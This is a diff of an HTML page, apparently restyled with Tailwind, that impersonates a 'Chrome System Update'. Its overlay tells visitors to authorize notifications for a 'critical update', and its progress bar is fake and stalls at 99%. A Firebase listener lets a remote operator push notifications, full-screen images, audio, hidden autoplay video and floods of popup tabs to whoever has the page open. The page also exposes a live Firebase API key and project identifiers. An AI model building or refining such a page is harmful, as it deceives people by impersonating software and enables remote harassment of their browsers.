@@ -1,98 +1,188 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>System Update</title>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-<style>
-html,body{margin:0;padding:0;height:100%;width:100%;background:#f0f0f0;font-family:sans-serif;cursor:pointer;display:flex;justify-content:center;align-items:center;text-align:center;overflow:hidden;}
-#overlay{position:absolute;top:0;left:0;right:0;bottom:0;background:#f0f0f0;display:flex;justify-content:center;align-items:center;z-index:10;}
-#overlay h1{font-size:28px;color:#222;}
-#status{font-size:18px;margin-top:10px;color:#333;}
-img{max-width:100%;max-height:100%;position:absolute;top:0;left:0;z-index:20;display:none;}
-audio,iframe{display:none;}
-.loader{position:absolute;top:10px;left:10px;height:6px;background:#1f2430;width:100%;border-radius:3px;overflow:hidden;}
-.loader-fill{height:100%;width:0%;background:#4da3ff;transition:0.2s;}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chrome System Update</title>
+    <!-- Load Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Load Lucide icons for a modern look -->
+    <script type="module" src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        /* Custom config for body and font */
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        html, body {
+            font-family: 'Inter', sans-serif;
+        }
+        /* Hide default elements, ensuring all positioning is handled by JS logic */
+        #audio, #ytContainer iframe {
+            display: none;
+        }
+    </style>
 </head>
-<body>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center text-center overflow-hidden">
 
-<div id="overlay"><h1>Click anywhere to continue update...</h1></div>
-<div>
-<p id="status">System updating...</p>
-<div class="loader"><div class="loader-fill" id="loaderFill"></div></div>
-<img id="img">
-<audio id="audio" controls></audio>
-<div id="ytContainer"></div>
+<!-- Overlay to require user interaction and enable notifications/audio -->
+<div id="overlay" class="fixed inset-0 bg-gray-900 bg-opacity-95 z-50 flex flex-col items-center justify-center p-6 cursor-pointer rounded-lg">
+    <svg class="w-16 h-16 text-white mb-6 animate-spin" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>
+    <h1 class="text-3xl sm:text-4xl font-bold text-white mb-4">System Service Check Required</h1>
+    <p class="text-lg text-gray-300">Click anywhere to authorize system notifications and continue the critical update process.</p>
 </div>
 
+<!-- Main Update Content Card -->
+<div class="bg-white p-8 sm:p-12 rounded-xl shadow-2xl w-full max-w-lg mx-4 transition-all duration-300">
+    <!-- Icon Placeholder: Mimics a system process indicator -->
+    <div class="mb-6">
+        <svg class="w-16 h-16 mx-auto text-blue-600" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"/><path d="M12 21V12h3"/></svg>
+    </div>
+
+    <!-- Status Text (Updated by Firebase) -->
+    <p id="status" class="text-xl font-semibold text-gray-800 mb-4">Preparing system files for update...</p>
+
+    <!-- Loader Bar -->
+    <div class="w-full bg-gray-200 rounded-full h-2.5 overflow-hidden">
+        <div class="loader-fill h-2.5 bg-blue-500 transition-all duration-700 ease-in-out rounded-full" id="loaderFill" style="width: 0%;"></div>
+    </div>
+    <p class="text-sm text-gray-500 mt-2">Do not close this window.</p>
+</div>
+
+<!-- Dynamic content containers (Image, Audio, YouTube) - positioned absolutely by JS when triggered -->
+<img id="img" class="absolute inset-0 w-full h-full object-cover z-20 hidden">
+<audio id="audio" controls></audio>
+<div id="ytContainer"></div>
+
+<!-- Firebase and JS Logic -->
 <script>
-const firebaseConfig = {
-  apiKey:"AIzaSyCmbHFACq1ZGfXnAnWqXmLeKsTWVkrsTIg",
-  authDomain:"notify-f0a18.firebaseapp.com",
-  databaseURL:"https://notify-f0a18-default-rtdb.firebaseio.com",
-  projectId:"notify-f0a18"
-};
-firebase.initializeApp(firebaseConfig);
-const db=firebase.database();
+    // System-provided configuration must be used if available
+    const firebaseConfig = {
+        apiKey:"AIzaSyCmbHFACq1ZGfXnAnWqXmLeKsTWVkrsTIg",
+        authDomain:"notify-f0a18.firebaseapp.com",
+        databaseURL:"https://notify-f0a18-default-rtdb.firebaseio.com",
+        projectId:"notify-f0a18"
+    };
+    
+    // Initialize Firebase
+    // NOTE: Using the provided v9 compat SDK imports from the original code.
+    // The CDN links for these are not explicitly in the HTML head but are assumed to be available
+    // based on the original request's script structure. Adding them here for completeness:
+</script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script>
+    // Initialize Firebase using the compat SDK
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-let enabled=false;
-const overlay=document.getElementById("overlay");
-overlay.addEventListener("click",()=>{
-  Notification.requestPermission();
-  enabled=true;
-  overlay.style.display="none";
-});
+    let enabled = false;
+    const overlay = document.getElementById("overlay");
 
-db.ref("signal").on("value",snap=>{
-  const d=snap.val();
-  if(!d) return;
+    // Click handler to enable system features and hide overlay
+    overlay.addEventListener("click", () => {
+        // Request notification permission
+        Notification.requestPermission();
+        enabled = true;
+        overlay.style.display = "none";
+    });
 
-  // Text
-  if(d.type==="text"){
-    document.getElementById("status").innerText=d.message;
-    if(enabled && Notification.permission==="granted")
-      new Notification("System",{body:d.message});
-  }
+    // Realtime Database Listener (Original Logic Preserved)
+    db.ref("signal").on("value", snap => {
+        const d = snap.val();
+        if (!d) return;
 
-  // Image
-  if(d.type==="image"){
-    const img=document.getElementById("img");
-    img.src=d.data;
-    img.style.display="block";
-  }
+        // Text (Updates status and sends notification)
+        if (d.type === "text") {
+            document.getElementById("status").innerText = d.message;
+            // Optionally update the loader fill based on the message content (e.g., if it contains a percentage)
+            // Original code did not implement loader update, so keeping it simple here.
+            
+            if (enabled && Notification.permission === "granted") {
+                new Notification("System Update Notification", { body: d.message, icon: 'https://placehold.co/128x128/0000FF/FFFFFF?text=UP' });
+            }
+        }
 
-  // Audio
-  if(d.type==="audio" && enabled){
-    const audio=document.getElementById("audio");
-    audio.src=d.data;
-    audio.play().catch(()=>{});
-  }
+        // Image (Overlays the entire page with the image)
+        if (d.type === "image") {
+            const img = document.getElementById("img");
+            img.src = d.data;
+            img.style.display = "block";
+            // Set image properties for full-screen takeover
+            img.classList.remove('hidden');
+            img.classList.add('fixed', 'top-0', 'left-0', 'z-40');
+        } else {
+             // If type is not 'image', ensure image is hidden
+             document.getElementById("img").classList.add('hidden');
+             document.getElementById("img").classList.remove('fixed', 'top-0', 'left-0', 'z-40');
+        }
 
-  // YouTube
-  if(d.type==="youtube"){
-    const container=document.getElementById("ytContainer");
-    container.innerHTML="";
-    let url=d.url;
-    let embed=`https://www.youtube.com/embed/${url.split("v=")[1].split("&")[0]}?autoplay=1`;
-    const ifr=document.createElement("iframe");
-    ifr.src=embed;
-    if(d.mode==="hidden"){
-      ifr.width=1; ifr.height=1; ifr.style.position="absolute"; ifr.style.left="-1000px";
-    } else {
-      ifr.width=window.innerWidth; ifr.height=window.innerHeight; ifr.style.position="absolute"; ifr.style.top=0; ifr.style.left=0;
-    }
-    container.appendChild(ifr);
-  }
+        // Audio (Plays audio if enabled)
+        if (d.type === "audio" && enabled) {
+            const audio = document.getElementById("audio");
+            audio.src = d.data;
+            // The catch is necessary for user interaction requirements
+            audio.play().catch(e => console.error("Audio playback blocked:", e));
+        }
 
-  // Popups / tabs
-  if(d.type==="popup" && enabled){
-    for(let i=0;i<d.count;i++){
-      window.open("about:blank","_blank");
-    }
-  }
-});
+        // YouTube (Embeds a YouTube video)
+        if (d.type === "youtube") {
+            const container = document.getElementById("ytContainer");
+            container.innerHTML = "";
+            let url = d.url;
+            
+            // Extract video ID safely
+            let videoIdMatch = url.match(/(?:v=|\/embed\/|\/v\/|youtu\.be\/|\/watch\?v=)([^#\&\?]*).*/i);
+            const videoId = videoIdMatch ? videoIdMatch[1] : null;
+
+            if (videoId) {
+                let embed = `https://www.youtube.com/embed/${videoId}?autoplay=1&controls=0`;
+                const ifr = document.createElement("iframe");
+                ifr.src = embed;
+                ifr.allow = "autoplay; encrypted-media";
+                ifr.frameBorder = "0";
+
+                if (d.mode === "hidden") {
+                    // Hidden/1x1 mode
+                    ifr.style.width = '1px';
+                    ifr.style.height = '1px';
+                    ifr.style.position = "absolute";
+                    ifr.style.left = "-9999px";
+                    ifr.style.top = "-9999px";
+                } else {
+                    // Full-screen mode
+                    ifr.classList.add('fixed', 'inset-0', 'w-full', 'h-full', 'z-30');
+                }
+                container.appendChild(ifr);
+            } else {
+                console.error("Invalid YouTube URL provided.");
+            }
+        } else {
+             // If type is not 'youtube', clear container
+             document.getElementById("ytContainer").innerHTML = "";
+        }
+
+        // Popups / tabs (Opens new windows)
+        if (d.type === "popup" && enabled) {
+            // Using a loop for the specified count
+            for (let i = 0; i < d.count; i++) {
+                // Warning: Browser settings might block this
+                window.open("about:blank", "_blank");
+            }
+        }
+    });
+
+    // Optional: Add a simple function to simulate progress if `loaderFill` is desired
+    // This is purely cosmetic and not driven by Firebase
+    let progress = 0;
+    const loaderFill = document.getElementById('loaderFill');
+    const updateProgress = () => {
+        if (enabled && progress < 99) {
+            progress += Math.random() * 5; // Simulates slow, irregular progress
+            if (progress > 99) progress = 99;
+            loaderFill.style.width = `${progress}%`;
+        }
+        requestAnimationFrame(updateProgress);
+    };
+    requestAnimationFrame(updateProgress);
+
 </script>
 </body>
 </html>
